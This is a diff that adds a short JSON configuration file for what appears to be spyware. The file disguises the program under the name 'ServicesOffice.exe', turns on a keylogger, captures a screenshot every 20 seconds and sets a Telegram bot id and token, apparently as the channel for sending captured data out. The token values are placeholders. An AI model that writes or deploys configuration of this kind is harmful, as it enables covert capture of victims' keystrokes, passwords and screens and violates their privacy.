@@ -1,0 +1,20 @@
+{
+    "general" : {
+      "debug":"0",
+      "delay":"0",    
+      "code" : "PC_TEST",
+      "name_software":"ServicesOffice.exe" 
+    },
+    "keylogger":{
+        "active":"1",
+        "limit":"50"
+    },
+    "screenshot":{
+        "active":"1",
+        "interval_seconds":"20"
+    },
+    "telegram_bot":{
+        "id":"-xxxxxxxxxx",
+        "token":"xxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    }
+}
